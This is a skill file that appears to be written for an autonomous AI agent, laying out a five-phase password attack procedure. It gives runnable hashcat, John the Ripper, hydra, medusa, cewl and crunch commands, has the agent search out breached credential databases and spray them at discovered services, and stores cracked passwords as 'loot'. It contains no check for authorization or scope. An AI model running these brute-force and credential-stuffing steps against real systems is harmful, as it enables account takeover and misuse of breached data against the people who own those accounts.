---
name: password-attack
description: Password cracking and brute force — hash identification, dictionary attacks, rule-based cracking, online brute force, credential stuffing
---

# Password Attack Skill

Comprehensive password cracking and authentication attack methodology.

## Phase 1: Hash Identification
1. Use `hash_crack` to identify the hash type
2. Use `encode_decode` format "base64" to decode potential encoded passwords
3. Use `web_search` for hash lookup in known databases

## Phase 2: Offline Cracking
4. Hashcat dictionary: `execute_command`: `hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt`
5. Hashcat rules: `execute_command`: `hashcat -m MODE hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule`
6. Hashcat mask: `execute_command`: `hashcat -m MODE hash.txt -a 3 ?u?l?l?l?l?d?d?d`
7. John the Ripper: `execute_command`: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
8. John rules: `execute_command`: `john --rules --wordlist=wordlist.txt hash.txt`

## Phase 3: Online Brute Force
9. SSH: `execute_command`: `hydra -l admin -P wordlist.txt ssh://target`
10. HTTP POST: `execute_command`: `hydra -l admin -P wordlist.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"`
11. FTP: `execute_command`: `hydra -l admin -P wordlist.txt ftp://target`
12. RDP: `execute_command`: `hydra -l admin -P wordlist.txt rdp://target`
13. MySQL: `execute_command`: `hydra -l root -P wordlist.txt mysql://target`
14. Custom: `execute_command`: `medusa -h target -u admin -P wordlist.txt -M service`

## Phase 4: Credential Stuffing
15. Use `web_search` for breached credential databases
16. Generate credential lists combining known usernames + common passwords
17. Use `execute_command` to spray credentials against discovered services
18. Test credential reuse across multiple services

## Phase 5: Custom Wordlist Generation
19. Use `execute_command`: `cewl -d 3 -m 5 https://target.com -w custom_wordlist.txt` (scrape site)
20. Use `execute_command`: `crunch 8 12 -t @@@@@@%% -o generated.txt` (pattern generation)
21. Use `write_file` to create targeted wordlist based on OSINT data
22. Store cracked credentials with `memory_store` action "store_loot"
23. Save report with `save_artifact`
